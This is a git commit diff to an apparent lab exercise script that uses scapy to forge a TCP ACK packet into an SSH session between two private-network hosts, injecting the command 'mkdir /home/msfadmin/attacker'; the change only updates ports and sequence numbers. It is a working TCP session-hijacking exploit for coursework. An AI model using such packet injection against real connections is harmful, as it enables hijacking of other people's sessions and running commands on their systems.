b2d3c01242180909ffd7878f09bed6469fa1c098
FishRainBlow <82390676+FishRainBlow@users.noreply.github.com>
2024-07-30 13:50:43 +0800

    Update Q5_hj.py

--- Code Files/Q5_hj.py
+++ Code Files/Q5_hj.py
@@ -3,7 +3,7 @@ import sys
 from scapy.all import *
 
 IPLayer = IP (src="10.10.10.200", dst = "10.10.10.196")
-TCPLayer = TCP (sport=42722, dport=22, flags="A", seq=2759247166, ack=288601948)
+TCPLayer = TCP (sport=42728, dport=22, flags="A", seq=4064847561, ack=1405048854)
 
 data = "\n mkdir /home/msfadmin/attacker \n"
 
